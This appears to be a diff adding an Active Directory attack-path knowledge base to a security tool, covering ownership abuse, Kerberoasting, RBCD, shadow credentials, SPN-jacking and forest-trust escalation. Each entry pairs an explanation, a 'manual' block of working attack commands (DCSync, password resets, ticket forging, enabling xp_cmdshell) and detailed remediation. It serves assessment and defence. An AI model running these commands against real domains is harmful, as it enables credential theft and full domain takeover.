+            "Treat a compromised RODC as compromise of every account whose secret it was allowed to cache: rotate those account passwords and the per-RODC krbtgt account (msDS-KrbTgtLink) after any RODC compromise.",
+            "Physically and logically protect RODCs to the standard of the accounts they cache; a branch-office RODC that caches privileged accounts is a Tier-0 exposure.",
+            "Monitor writable DCs for Key List requests (Event ID 4769 for the target account paired with an RODC-scoped ticket) and investigate any that do not originate from a legitimate RODC.",
+        ),
+    },
+    "owns": {
+        "short": (
+            "{source} is the OWNER of {target}, and an object's owner can always "
+            "rewrite its DACL, so ownership is implicit full control over {target}."
+        ),
+        "long": (
+            "In Active Directory the owner of an object holds the implicit "
+            "WRITE_DAC and READ_CONTROL rights regardless of the object's DACL: an "
+            "owner can always read and rewrite the object's own permissions. So when "
+            "{source_type} {source} owns {target}, it can grant itself any explicit "
+            "right it wants (FullControl / GenericAll) by editing the DACL, and from "
+            "there run whatever technique that right enables — resetting a user's "
+            "password, configuring RBCD on a computer, adding a key credential for "
+            "PKINIT, or, if the target is the domain object, granting itself the "
+            "replication rights for DCSync. Ownership is therefore functionally "
+            "equivalent to GenericAll, but it is easy to overlook because it is not "
+            "listed as an ACE in the DACL — it is the owner field of the security "
+            "descriptor. Unexpected ownership of a sensitive object (a privileged "
+            "user, a computer, an OU, or the domain head) is a direct control "
+            "finding."
+        ),
+        "manual": (
+            "# Grant yourself full control over the object you own, then abuse it:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
+            "add genericAll {target} <user>\n"
+            "#   (or, using the ACE editor)  dacledit.py -action write -rights FullControl "
+            "-principal <user> -target {target} <domain>/<user>:<pass>"
+        ),
+        "verify_windows": (
+            "Read the owner of the object's security descriptor — an unexpected "
+            "owner is the finding:\n"
+            "(Get-Acl \"AD:$((Get-ADObject -Filter \"Name -eq '{target}'\")."
+            "DistinguishedName)\").Owner\n"
+            "# Or, directly:\n"
+            "Get-ADObject -LDAPFilter '(name={target})' -Properties nTSecurityDescriptor |\n"
+            "  ForEach-Object {{ $_.nTSecurityDescriptor.Owner }}"
+        ),
+        "verify_linux": (
+            "Read-only lookup of the object's owner via its security descriptor:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
+            "get object {target} --attr nTSecurityDescriptor\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/dacl"
+        ),
+        "remediation": (
+            "Read the object's owner and, where it is wrong, reset it to the correct administrative principal: Set-Acl on the AD path after building an owner with $acl.SetOwner([System.Security.Principal.NTAccount]'DOMAIN\\Domain Admins'), or dsacls \"<object-DN>\" /takeownership.",
+            "Investigate how ownership was acquired — an object created by a low-privileged account is owned by that account by default, and a Creator Owner ACE or a delegated create right on the parent OU is the usual source; correct the delegation so new objects are owned by an administrative group.",
+            "For sensitive containers, set the default owner on the parent OU and enable inheritance so newly created objects are owned by the intended administrative group, not by whoever ran the wizard.",
+            "Audit ownership of privileged users, computers, OUs, and the domain head periodically, and alert on Event ID 5136 modifications to the owner field of Tier-0 objects.",
+        ),
+    },
+    "allextendedrights": {
+        "short": (
+            "{source} holds All-Extended-Rights over {target}, a superset of the "
+            "control-access rights that includes password reset, LAPS read, and "
+            "DCSync — so it can fully control {target}."
+        ),
+        "long": (
+            "Extended rights are the special control-access rights AD defines beyond "
+            "ordinary read/write, each identified by a rights-GUID: Reset Password, "
+            "the DS-Replication-Get-Changes(-All) rights that make DCSync, the "
+            "ms-Mcs-AdmPwd (LAPS) read right, and others. AllExtendedRights grants "
+            "the WHOLE set at once. So when {source_type} {source} holds "
+            "AllExtendedRights over {target}, it holds every one of those rights "
+            "simultaneously: it can reset the target user's password, read the "
+            "target computer's LAPS password, or — if the target is the domain "
+            "object — perform DCSync. It is one of the most powerful ACEs to find on "
+            "a sensitive object because it collapses many distinct escalation "
+            "techniques into a single grant, and it is often introduced by an "
+            "over-broad delegation (a help-desk delegation applied at too high a "
+            "scope, for instance). The concrete follow-on depends on the target's "
+            "type, but in every case AllExtendedRights over a privileged object is a "
+            "direct path to controlling it."
+        ),
+        "manual": (
+            "# Target USER — reset the password using the extended right:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
+            "set password {target} 'Newp@ss123!'\n"
+            "# Target COMPUTER — read its LAPS local-admin password:\n"
+            "nxc ldap <dc_ip> -u <user> -p <pass> -d <domain> --module laps\n"
+            "# Target DOMAIN object — the set includes the replication rights (DCSync):\n"
+            "impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc_ip>"
+        ),
+        "verify_windows": (
+            "List the ACEs that grant All-Extended-Rights (ObjectType all-zeros GUID "
+            "with the ExtendedRight bit) over the object:\n"
+            "(Get-Acl \"AD:$((Get-ADObject -LDAPFilter '(name={target})')."
+            "DistinguishedName)\").Access |\n"
+            "  Where-Object {{ $_.ActiveDirectoryRights -match 'ExtendedRight' -and "
+            "$_.ObjectType -eq '00000000-0000-0000-0000-000000000000' }} |\n"
+            "  Select-Object IdentityReference, ActiveDirectoryRights"
+        ),
+        "verify_linux": (
+            "Read-only ACL analysis of who holds extended rights over the object:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
+            "get object {target} --attr nTSecurityDescriptor\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/dacl"
+        ),
+        "remediation": (
+            "Enumerate the ACEs granting All-Extended-Rights over the object and remove any that is not a required administrator: (Get-Acl \"AD:<object-DN>\").Access | Where-Object { $_.ActiveDirectoryRights -match 'ExtendedRight' -and $_.ObjectType -eq '00000000-0000-0000-0000-000000000000' }.",
+            "Revoke the over-broad ACE with dsacls (dsacls \"<object-DN>\" /R \"<principal>\") and replace it, where a delegation is genuinely needed, with the single specific extended right required (e.g. only Reset Password) rather than the whole set.",
+            "Find the delegation source — an AllExtendedRights ACE applied at an OU or the domain root usually comes from a delegation wizard run at too high a scope — and re-scope it to the narrowest OU and the least-privilege right.",
+            "Audit Event ID 5136 for ACL changes on Tier-0 objects and alert on any new AllExtendedRights grant to a non-administrative principal.",
+        ),
+    },
+    "writespn": {
+        "short": (
+            "{source} can write a servicePrincipalName onto {target}, making the "
+            "account kerberoastable on demand so its password hash can be requested "
+            "and cracked offline."
+        ),
+        "long": (
+            "Write access to the servicePrincipalName attribute of a target account "
+            "is a targeted-Kerberoasting primitive. Kerberoasting normally works "
+            "only against accounts that already have an SPN; but if {source_type} "
+            "{source} can WRITE the SPN attribute of {target}, it can ADD an "
+            "arbitrary SPN to that account, then request a service ticket (TGS-REP) "
+            "for it. Because the ticket is encrypted with the target account's "
+            "password-derived key, the attacker cracks it offline to recover the "
+            "password — and afterwards can remove the SPN it added to cover its "
+            "tracks. This converts a benign-looking attribute-write ACE into "
+            "credential theft against any account whose password is crackable, "
+            "including service and even privileged accounts. The write is usually "
+            "exposed by an over-broad WriteProperty ACE on the account object. It is "
+            "sometimes called 'targeted Kerberoasting' because the attacker chooses "
+            "the victim rather than relying on whoever already has an SPN."
+        ),
+        "manual": (
+            "# Add an SPN to the target, then roast it, then clean up:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
+            "set object {target} servicePrincipalName -v 'fake/svc'\n"
+            "impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> "
+            "-request-user {target} -outputfile roast.txt\n"
+            "hashcat -m 13100 roast.txt wordlist.txt\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
+            "set object {target} servicePrincipalName -v ''"
+        ),
+        "verify_windows": (
+            "List which principals can WRITE the servicePrincipalName property of "
+            "the target account:\n"
+            "(Get-Acl \"AD:$((Get-ADUser {target}).DistinguishedName)\").Access |\n"
+            "  Where-Object {{ $_.ActiveDirectoryRights -match 'WriteProperty' -and\n"
+            "    ($_.ObjectType -eq 'f3a64788-5306-11d1-a9c5-0000f80367c1' -or\n"
+            "     $_.ObjectType -eq '00000000-0000-0000-0000-000000000000') }} |\n"
+            "  Select-Object IdentityReference, ActiveDirectoryRights"
+        ),
+        "verify_linux": (
+            "Read-only ACL analysis of who can write the SPN of the target "
+            "account:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
+            "get object {target} --attr nTSecurityDescriptor\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting"
+        ),
+        "remediation": (
+            "Enumerate who can write the servicePrincipalName attribute of the account and remove non-administrative principals: (Get-Acl \"AD:<account-DN>\").Access | Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty' -and $_.ObjectType -eq 'f3a64788-5306-11d1-a9c5-0000f80367c1' }.",
+            "Revoke the offending ACE with dsacls (dsacls \"<account-DN>\" /R \"<principal>\") so only intended administrators can modify SPNs, closing the targeted-Kerberoasting avenue.",
+            "Enforce strong (25+ character) passwords on any account that could be given an SPN, or migrate service identities to gMSA, so an added SPN yields an uncrackable ticket.",
+            "Audit Event ID 5136 for changes to the servicePrincipalName attribute and Event ID 4769 with RC4 encryption for the roast itself, and alert on an SPN added then removed within a short window.",
+        ),
+    },
+    "writeaccountrestrictions": {
+        "short": (
+            "{source} can write the account-restriction property set of {target}; on "
+            "a computer object this includes msDS-AllowedToActOnBehalfOfOtherIdentity, "
+            "enabling resource-based constrained delegation."
+        ),
+        "long": (
+            "The Account Restrictions property set groups several account-control "
+            "attributes, and write access to it over a COMPUTER object includes "
+            "write access to msDS-AllowedToActOnBehalfOfOtherIdentity — the "
+            "attribute that configures Resource-Based Constrained Delegation (RBCD). "
+            "When {source_type} {source} can write account restrictions on {target}, "
+            "it can point that attribute at a computer account it already controls, "
+            "which authorises that controlled account to impersonate ANY user to "
+            "services on {target} via S4U2Self + S4U2Proxy. The attacker then "
+            "requests a service ticket as, for example, a domain administrator to a "
+            "service on {target} and gains privileged access to the host. If the "
+            "attacker does not already own a computer account, it creates one "
+            "(subject to ms-DS-MachineAccountQuota) to use as the delegate. This "
+            "turns an attribute-write ACE on a computer into full compromise of that "
+            "computer. The abuse needs a controlled account with an SPN as the "
+            "delegate; RBCD via an already-owned computer works even when "
+            "MachineAccountQuota is exhausted."
+        ),
+        "manual": (
+            "# Point the target computer's RBCD attribute at a controlled account,\n"
+            "# then impersonate a privileged user to a service on the target:\n"
+            "impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to '{target}' "
+            "-action write <domain>/<user>:<pass>\n"
+            "impacket-getST -spn cifs/{target} -impersonate Administrator "
+            "-dc-ip <dc_ip> <domain>/'ATTACKER$':<machine_pass>"
+        ),
+        "verify_windows": (
+            "List who can write the account-restrictions property set on the "
+            "computer object, and read the current RBCD attribute:\n"
+            "(Get-Acl \"AD:$((Get-ADComputer {target}).DistinguishedName)\").Access |\n"
+            "  Where-Object {{ $_.ObjectType -eq "
+            "'4c164200-20c0-11d0-a768-00aa006e0529' }}\n"
+            "Get-ADComputer {target} -Properties "
+            "msDS-AllowedToActOnBehalfOfOtherIdentity"
+        ),
+        "verify_linux": (
+            "Read-only ACL analysis of who can write account restrictions on the "
+            "computer:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
+            "get object {target} --attr nTSecurityDescriptor\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"
+        ),
+        "remediation": (
+            "Enumerate who can write the account-restrictions property set on the computer and remove non-administrative principals: (Get-Acl \"AD:<computer-DN>\").Access | Where-Object { $_.ObjectType -eq '4c164200-20c0-11d0-a768-00aa006e0529' }.",
+            "Read and, where unexpected, clear the RBCD attribute: Get-ADComputer <host> -Properties msDS-AllowedToActOnBehalfOfOtherIdentity then Set-ADComputer <host> -Clear msDS-AllowedToActOnBehalfOfOtherIdentity.",
+            "Set ms-DS-MachineAccountQuota to 0 (Set-ADDomain -Identity <domain> -Replace @{'ms-DS-MachineAccountQuota'=0}) so an attacker cannot create a new computer account to use as the delegate — note this does not stop RBCD via an already-owned computer, so the ACE fix above is the primary control.",
+            "Audit Event ID 5136 for changes to msDS-AllowedToActOnBehalfOfOtherIdentity and Event ID 4769 for S4U2Proxy ticket requests, and alert on delegation configured to a non-service computer account.",
+        ),
+    },
+    "writelogonscript": {
+        "short": (
+            "{source} can set the scriptPath (logon script) of {target} to "
+            "attacker-controlled content, so the next time {target} logs on it runs "
+            "the attacker's code as that user."
+        ),
+        "long": (
+            "The scriptPath attribute of a user object names a logon script that the "
+            "workstation executes, in the user's context, at each interactive logon. "
+            "When {source_type} {source} can write scriptPath on {target}, it points "
+            "the attribute at a script it controls (placed on the NETLOGON share, "
+            "which authenticated users can read, or at a reachable UNC path). The "
+            "next time {target} logs on, that script runs with {target}'s privileges "
+            "— giving the attacker code execution as the victim without knowing their "
+            "password. It is a wait-for-logon primitive: the payload fires on the "
+            "user's schedule, not the attacker's, so it is patient rather than "
+            "immediate, and it depends on the target actually logging on and on the "
+            "attacker being able to write the referenced script content to a path the "
+            "workstation will read. The exposure comes from a write ACE on the user "
+            "object combined with write access to a logon-script location."
+        ),
+        "manual": (
+            "# Set the target's logon script to a payload the workstation will run:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
+            "set object {target} scriptPath -v 'evil.bat'\n"
+            "#   (place evil.bat on \\\\<domain>\\NETLOGON, then wait for {target} to log on)"
+        ),
+        "verify_windows": (
+            "Read the target's current logon script and list who can WRITE the "
+            "scriptPath attribute:\n"
+            "Get-ADUser {target} -Properties scriptPath | "
+            "Select-Object SamAccountName, scriptPath\n"
+            "(Get-Acl \"AD:$((Get-ADUser {target}).DistinguishedName)\").Access |\n"
+            "  Where-Object {{ $_.ActiveDirectoryRights -match 'WriteProperty' }} |\n"
+            "  Select-Object IdentityReference, ObjectType"
+        ),
+        "verify_linux": (
+            "Read-only lookup of the target's logon script and object ACL:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
+            "get object {target} --attr scriptPath\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/dacl"
+        ),
+        "remediation": (
+            "List who can write the scriptPath attribute of the user object and remove non-administrative principals: (Get-Acl \"AD:<user-DN>\").Access | Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty' }.",
+            "Revoke the offending write ACE with dsacls (dsacls \"<user-DN>\" /R \"<principal>\") so only administrators can set logon scripts, and prefer Group Policy logon scripts over per-user scriptPath so the attribute is not a per-object write target.",
+            "Lock down the logon-script locations: restrict write access to the NETLOGON share (and any UNC path referenced by scriptPath) to administrators, and audit its contents for unexpected files.",
+            "Audit Event ID 5136 for changes to the scriptPath attribute and monitor NETLOGON for new/modified script files; alert on a scriptPath set by a non-administrative principal.",
+        ),
+    },
+    "hasshadowcredentials": {
+        "short": (
+            "{target} already carries a key credential (msDS-KeyCredentialLink), so "
+            "an attacker who controls the corresponding private key can PKINIT as "
+            "{target} and recover its NT hash without its password."
+        ),
+        "long": (
+            "The msDS-KeyCredentialLink attribute holds public key credentials used "
+            "for certificate-based (PKINIT) Kerberos authentication — the mechanism "
+            "behind Windows Hello for Business. When an object already has a shadow "
+            "credential entry on {target}, whoever controls the matching private key "
+            "can authenticate as {target} over PKINIT and, via the U2U / UnPAC-the-"
+            "hash technique, recover {target}'s NT hash — all without ever knowing "
+            "or resetting the account's password, and without leaving a password-"
+            "reset trace. Legitimate WHfB entries are written by a domain controller; "
+            "a key credential added by any non-DC principal, or present where WHfB is "
+            "not deployed, is the signature of an attacker having planted (or found) "
+            "a shadow credential to maintain access as the account. Because it "
+            "survives a password change, it is also a persistence primitive: once "
+            "the key credential is in place, the account is impersonable until the "
+            "attribute is cleaned. The prerequisite for abuse is possession of the "
+            "private key matching an entry present on {target}."
+        ),
+        "manual": (
+            "# If the attacker controls the key credential, PKINIT as the target and\n"
+            "# UnPAC its NT hash:\n"
+            "certipy shadow auto -u <user>@<domain> -p <pass> -account {target} "
+            "-dc-ip <dc_ip>\n"
+            "#   (this authenticates via the existing key credential and returns the NT hash)"
+        ),
+        "verify_windows": (
+            "List every object carrying a key credential and confirm which "
+            "principal set it — entries from a non-DC principal are suspicious:\n"
+            "Get-ADObject -LDAPFilter '(msDS-KeyCredentialLink=*)' -Properties "
+            "msDS-KeyCredentialLink |\n"
+            "  Select-Object DistinguishedName, msDS-KeyCredentialLink\n"
+            "# Check the specific target:\n"
+            "Get-ADObject -Identity (Get-ADUser {target}).DistinguishedName "
+            "-Properties msDS-KeyCredentialLink"
+        ),
+        "verify_linux": (
+            "Read-only enumeration of the target's key credentials (no "
+            "authentication performed):\n"
+            "certipy shadow list -u <user>@<domain> -p <pass> -account {target} "
+            "-dc-ip <dc_ip>\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials"
+        ),
+        "remediation": (
+            "Enumerate every object carrying a key credential and audit each entry against your Windows Hello for Business rollout: Get-ADObject -LDAPFilter '(msDS-KeyCredentialLink=*)' -Properties msDS-KeyCredentialLink.",
+            "Remove unexpected entries — anything set by a non-DC principal or present where WHfB is not deployed: Set-ADObject -Identity <DN> -Clear msDS-KeyCredentialLink; then reset the affected account's password, as the shadow credential was an alternate authentication path.",
+            "Restrict who can write msDS-KeyCredentialLink on user and computer objects to the DCs / WHfB provisioning service, and remove any delegated write ACE that a non-DC principal holds on the attribute.",
+            "Enable DS-Access auditing on msDS-KeyCredentialLink (Event ID 5136) in the Default Domain Controllers policy and alert on any write originating from a principal that is not a domain controller.",
+        ),
+    },
+    "privilegedgroupcontrol": {
+        "short": (
+            "{source} is a member of a terminal privileged group that directly "
+            "controls {target}, so it holds that control by membership with no "
+            "further technique required."
+        ),
+        "long": (
+            "Some group memberships ARE the compromise — no exploitation step "
+            "remains once you are in the group. When {source_type} {source} belongs "
+            "to a terminal privileged control group (Domain Admins, Enterprise "
+            "Admins, BUILTIN\\Administrators, or another group whose rights directly "
+            "control {target}), the membership itself grants control: a Domain Admin "
+            "can already act against any object in the domain, so there is no "
+            "separate attack to run. This edge exists in the graph to make that "
+            "control explicit rather than implied — it records that the path has "
+            "reached a principal whose group membership already owns the target. The "
+            "risk is not a technique to detect but a membership to justify: every "
+            "member of such a group is effectively Tier-0-equivalent for the scope "
+            "the group controls, so unexpected or nested membership in these groups "
+            "is itself the finding. Remediation is membership hygiene, not patching a "
+            "protocol."
+        ),
+        "manual": (
+            "# Membership IS the control — confirm and, if warranted, exercise it.\n"
+            "# List the privileged group's members (nested included):\n"
+            "nxc ldap <dc_ip> -u <user> -p <pass> -d <domain> --groups 'Domain Admins'\n"
+            "#   As a member, control of the target follows directly (e.g. reset a\n"
+            "#   password, or DCSync the domain):\n"
+            "impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc_ip>"
+        ),
+        "verify_windows": (
+            "List the effective (recursive) membership of the terminal privileged "
+            "group and confirm every member belongs there:\n"
+            "Get-ADGroupMember -Identity 'Domain Admins' -Recursive |\n"
+            "  Select-Object name, objectClass, distinguishedName\n"
+            "# Repeat for Enterprise Admins and BUILTIN\\Administrators."
+        ),
+        "verify_linux": (
+            "Read-only enumeration of the privileged group's membership over "
+            "LDAP:\n"
+            "nxc ldap <dc_ip> -u <user> -p <pass> -d <domain> --groups 'Domain Admins'\n"
+            "# Reference: https://www.thehacker.recipes/ad/recon/bloodhound"
+        ),
+        "remediation": (
+            "Audit the recursive membership of every terminal privileged group and remove accounts that do not require standing membership: Get-ADGroupMember -Identity 'Domain Admins' -Recursive (repeat for Enterprise Admins, Schema Admins, and BUILTIN\\Administrators).",
+            "Eliminate nested groups inside Tier-0 groups so a single lower-tier group cannot silently confer Domain Admin; privileged groups should contain only individually-vetted, dedicated admin accounts.",
+            "Adopt just-in-time / time-bound privileged access (Privileged Access Management) so accounts are added to Tier-0 groups only for the duration of a task, keeping the standing membership near-empty.",
+            "Protect the groups with the AdminSDHolder / SDProp mechanism and alert on Event ID 4728/4756 (member added to a security-enabled global/universal group) for any Tier-0 group.",
+        ),
+    },
+    "spnjack": {
+        "short": (
+            "{source} hijacks a delegated SPN — moving the SPN it can delegate to "
+            "onto {target}, then abusing constrained delegation with protocol "
+            "transition (S4U) to impersonate any user to {target}."
+        ),
+        "long": (
+            "SPN-jacking abuses constrained delegation with protocol transition "
+            "(the T2A4D / TrustedToAuthForDelegation flag) together with write "
+            "access to service principal names. {source_type} {source} holds "
+            "msDS-AllowedToDelegateTo entries plus TrustedToAuthForDelegation, which "
+            "lets it request tickets, via S4U2Self then S4U2Proxy, to the specific "
+            "services named in its delegation list — and, crucially, it can request "
+            "them as ANY user (protocol transition). The 'jack' is that an SPN is "
+            "not permanently bound to one host: by moving the SPN that appears in "
+            "the delegation list from its legitimate owner onto {target}, the "
+            "attacker makes its existing delegation right resolve to {target}. It "
+            "then performs S4U to obtain a service ticket to {target} impersonating "
+            "a privileged user (e.g. a domain administrator), gaining privileged "
+            "access to that host. This chains an attribute manipulation (SPN move) "
+            "with a delegation the principal already legitimately holds, so it needs "
+            "no password of the victim and no new delegation grant."
+        ),
+        "manual": (
+            "# Move the delegated SPN onto the target, then S4U to it as a privileged user:\n"
+            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
+            "set object {target} servicePrincipalName -v 'cifs/{target}'\n"
+            "impacket-getST -spn cifs/{target} -impersonate Administrator "
+            "-dc-ip <dc_ip> <domain>/<delegating-account>:<pass>"
+        ),
+        "verify_windows": (
+            "Identify accounts configured for constrained delegation with protocol "
+            "transition (the SPN-jack prerequisite):\n"
+            "Get-ADObject -LDAPFilter "
+            "'(&(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))' "
+            "-Properties msDS-AllowedToDelegateTo, servicePrincipalName |\n"
+            "  Select-Object Name, msDS-AllowedToDelegateTo\n"
+            "# Confirm SPN uniqueness — a duplicate SPN is the jack:\n"
+            "setspn -Q cifs/{target}"
+        ),
+        "verify_linux": (
+            "Read-only enumeration of constrained-delegation-with-protocol-"
+            "transition accounts:\n"
+            "nxc ldap <dc_ip> -u <user> -p <pass> -d <domain> --trusted-for-delegation\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/delegations"
+        ),
+        "remediation": (
+            "Enumerate accounts configured for constrained delegation with protocol transition and remove the flag where it is not required: Get-ADObject -LDAPFilter '(&(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))', then Set-ADAccountControl -Identity <account> -TrustedToAuthForDelegation $false.",
+            "Restrict who can write servicePrincipalName so an attacker cannot move an SPN onto a target: (Get-Acl \"AD:<computer-DN>\").Access | Where-Object { $_.ObjectType -eq 'f3a64788-5306-11d1-a9c5-0000f80367c1' }; revoke non-admin write ACEs with dsacls.",
+            "Add sensitive accounts to the Protected Users group and set 'Account is sensitive and cannot be delegated' (Set-ADAccountControl -AccountNotDelegated $true) so they can never be impersonated through delegation.",
+            "Monitor Event ID 5136 for servicePrincipalName changes and Event ID 4769 for S4U2Proxy ticket requests; a privileged user impersonated to a host by a delegating service account is the SPN-jack signature.",
+        ),
+    },
+    "crossorgtgtdelegation": {
+        "short": (
+            "{source} escalates across a forest trust by abusing cross-organization "
+            "TGT delegation: it captures a forwardable ticket-granting ticket that "
+            "crosses the trust boundary and replicates the trusting forest as its DC."
+        ),
+        "long": (
+            "A forest trust configured with cross-organization TGT delegation "
+            "(the CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION flag) causes a principal "
+            "authenticating from the trusted forest to leave a FORWARDABLE "
+            "ticket-granting ticket that can cross the trust boundary. From a "
+            "compromised trusted forest, {source} abuses this: it coerces a domain "
+            "controller in the TRUSTING forest to authenticate to a service whose "
+            "key it holds, captures the forwarded TGT that the coerced "
+            "authentication carries, and then uses that ticket to act as the "
+            "trusting-forest DC — including replicating its directory (DCSync). The "
+            "result collapses the boundary between the two forests: a compromise "
+            "confined to one forest becomes control of the other. This is a "
+            "high-severity cross-forest escalation because forest trusts are widely "
+            "assumed to be a security boundary; TGT delegation across them undoes "
+            "that assumption. The prerequisites are control of the trusted forest, "
+            "the delegation flag set on the trust, and the ability to coerce a "
+            "trusting-forest DC to authenticate back."
+        ),
+        "manual": (
+            "# Coerce a trusting-forest DC to authenticate, capturing its forwardable\n"
+            "# TGT, then replicate the trusting forest with it:\n"
+            "impacket-getST -u2u -impersonate 'DC$@<trusting-domain>' "
+            "-spn 'host/<trusted-host>' -k -no-pass <trusted-domain>/<user>\n"
+            "impacket-secretsdump -k -no-pass -just-dc <trusting-domain>/'DC$'@<trusting-dc>"
+        ),
+        "verify_windows": (
+            "Inspect the forest trust for TGT-delegation (a trust with delegation "
+            "enabled is the exposure):\n"
+            "Get-ADTrust -Filter * |\n"
+            "  Select-Object Name, Direction, ForestTransitive, "
+            "TGTDelegation, SIDFilteringForestAware\n"
+            "# TGTDelegation = True on an inbound/bidirectional forest trust is the flag."
+        ),
+        "verify_linux": (
+            "Read-only enumeration of the forest trusts and their attributes:\n"
+            "nxc ldap <dc_ip> -u <user> -p <pass> -d <domain> --query "
+            "'(objectClass=trustedDomain)' 'trustAttributes trustDirection'\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/trusts"
+        ),
+        "remediation": (
+            "Audit every forest trust and disable TGT delegation where it is set: Get-ADTrust -Filter * | Select-Object Name, TGTDelegation, then Set-ADTrust -Identity <trust> -TGTDelegation $false so forwardable tickets no longer cross the trust boundary.",
+            "Enable SID filtering (quarantine) on the trust unless a specific business need documents otherwise, so injected SIDs from the trusted forest are stripped: netdom trust <trusting> /domain:<trusted> /quarantine:yes.",
+            "Add high-value accounts to Protected Users and set 'Account is sensitive and cannot be delegated' so their tickets are never forwardable across the trust.",
+            "Monitor DCs for Event IDs 4768/4769 involving another forest's DC account and for replication (Event 4662) requested by a principal authenticating across the trust.",
+        ),
+    },
+    "raisechild": {
+        "short": (
+            "{source} escalates from a compromised child domain to the forest root "
+            "by forging an inter-realm ticket that injects the forest-root "
+            "privileged SID history, using the shared forest trust key."
+        ),
+        "long": (
+            "Within a single forest, a child domain and its parent share the "
+            "inter-realm trust key, and the forest is a single security boundary — "
+            "so a full compromise of a child domain yields the material to take over "
+            "the forest root. {source}, having compromised the child domain (holding "
+            "its krbtgt key), forges an inter-realm ticket-granting ticket and, "
+            "because SID filtering is not applied inside a forest, injects the "
+            "forest-root Enterprise Admins SID into the ticket's SID-history field. "
+            "Presented to the parent, that ticket is honoured as a member of "
+            "Enterprise Admins, granting control of the forest root and thereby the "
+            "whole forest. This is the canonical child-to-parent / SID-history "
+            "escalation: it is not a misconfiguration to patch but a structural "
+            "property of the forest trust model, which is precisely why the forest — "
+            "not the domain — is the true security boundary, and why every child "
+            "domain must be administered to the same standard as the root. The "
+            "prerequisite is full compromise of the child domain (its krbtgt key)."
+        ),
+        "manual": (
+            "# From a compromised child (krbtgt key in hand), forge an inter-realm\n"
+            "# ticket carrying the forest-root Enterprise Admins SID history, then\n"
+            "# replicate the forest root:\n"
+            "impacket-raiseChild <child-domain>/<user>:<pass>\n"
+            "#   (or forge manually with impacket-ticketer -sids <EA-SID> ... then DCSync the root)"
+        ),
+        "verify_windows": (
+            "Confirm the forest topology and that intra-forest trusts do not (and "
+            "structurally cannot) SID-filter — every child is inside the boundary:\n"
+            "Get-ADForest | Select-Object Name, RootDomain, Domains\n"
+            "Get-ADTrust -Filter 'IntraForest -eq $true' |\n"
+            "  Select-Object Name, Direction, SIDFilteringForestAware"
+        ),
+        "verify_linux": (
+            "Read-only enumeration of the forest's domains and trusts:\n"
+            "nxc ldap <dc_ip> -u <user> -p <pass> -d <domain> --query "
+            "'(objectClass=trustedDomain)' 'name trustAttributes'\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/trusts"
+        ),
+        "remediation": (
+            "Administer every child domain to the same Tier-0 standard as the forest root — the forest, not the domain, is the security boundary, so a child-domain compromise is a forest compromise; there is no ACL or trust setting that separates them.",
+            "After any suspected child-domain compromise, reset the child domain's krbtgt password twice and treat the forest root as potentially compromised: rotate forest-root Tier-0 credentials and the root krbtgt as well.",
+            "Minimise the number of domains in the forest; each additional child domain is an additional path to the root. Consider consolidating to a single domain where the multi-domain model is not required.",
+            "Monitor forest-root DCs for Event ID 4768/4769 inter-realm tickets carrying SID history for Enterprise Admins and for replication (Event 4662) originating from a child-domain principal.",
+        ),
+    },
+    "mssql_token_theft_escalation": {
+        "short": (
+            "Even with SeImpersonatePrivilege removed from the SQL Server process, "
+            "{source} escalates to NT AUTHORITY\\SYSTEM on {target} by recovering a "
+            "token from a shared logon session."
+        ),
+        "long": (
+            "Once {source} holds sysadmin on the MSSQL instance on {target}, it can "
+            "run OS commands as the SQL Server service account. The usual local "
+            "escalation to SYSTEM relies on the service account's "
+            "SeImpersonatePrivilege (a 'potato' technique), but administrators "
+            "sometimes strip that privilege as a hardening measure. This technique "
+            "escalates anyway: rather than needing SeImpersonate, it recovers a "
+            "privileged token from a logon session shared on the host (the "
+            "Forshaw 2020 shared-logon-session token approach) and impersonates it "
+            "to reach NT AUTHORITY\\SYSTEM. SYSTEM on the database server means full "
+            "control of the host — reading its LSA secrets, dumping cached "
+            "credentials, and using its machine account for onward domain actions. "
+            "It is a distinct escalation path precisely because it survives the "
+            "common 'we removed SeImpersonate from the SQL service' hardening. The "
+            "prerequisite is sysadmin (or an equivalent code-exec foothold) on the "
+            "SQL Server instance."
+        ),
+        "manual": (
+            "# With MSSQL sysadmin, enable xp_cmdshell and confirm command execution\n"
+            "# as the service account, then run the token-theft escalation to SYSTEM:\n"
+            "impacket-mssqlclient -k <domain>/<user>@{target} -windows-auth\n"
+            "#   SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE;\n"
+            "#   SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\n"
+            "#   SQL> EXEC xp_cmdshell 'whoami';   -- runs as the SQL service account"
+        ),
+        "verify_windows": (
